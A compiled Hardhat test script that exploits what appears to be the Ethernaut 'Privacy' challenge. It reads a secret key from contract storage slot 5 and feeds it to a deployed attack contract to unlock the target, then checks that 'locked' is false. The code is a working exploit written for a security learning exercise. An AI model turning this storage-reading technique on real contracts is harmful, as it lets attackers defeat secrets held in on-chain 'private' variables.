"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const chai_1 = require("chai");
const hardhat_1 = require("hardhat");
describe("Elevator Exploit using Contract ", function () {
    let attackerContract, privacyContract, contractAddress, lockedValue;
    before("Setup for attack locally", async function () {
        // Learn how to convert to type of bytes in hardhat.
        contractAddress = "0xbcc275859ba7d161d3211c4165f94b8e059418f5";
        privacyContract = await hardhat_1.ethers.getContractAt("Privacy", contractAddress);
        const attackerContractFactory = await hardhat_1.ethers.getContractFactory("Attack");
        attackerContract = await attackerContractFactory.deploy(contractAddress);
        await attackerContract.deployed();
    });
    it("perform exploit", async function () {
        // // Attack flow
        // Lets view if the privacy contract is locked
        let originalLockedValue = await privacyContract.locked();
        console.log("The original locked value is: ", originalLockedValue);
        // Grab the storageSlot data at slot 5
        let keyData = await hardhat_1.ethers.provider.getStorageAt(contractAddress, 5);
        console.log("Key data looks like: ", keyData);
        // call our custom attack contract, to unlock the privacy contract
        // our attack contract, takes the bytes32 data at slot 5 and converts to bytes16
        let txAttack = await attackerContract.attack(keyData);
        let receiptAttack = await txAttack.wait();
        console.log("The receipt is", receiptAttack);
        // view the final locked value
        lockedValue = await privacyContract.locked();
        console.log("The new locked value is: ", lockedValue);
    });
    after("confirm exploit", async function () {
        // if false, privacy has been exploited
        (0, chai_1.expect)(lockedValue).to.be.eq(false);
    });
});
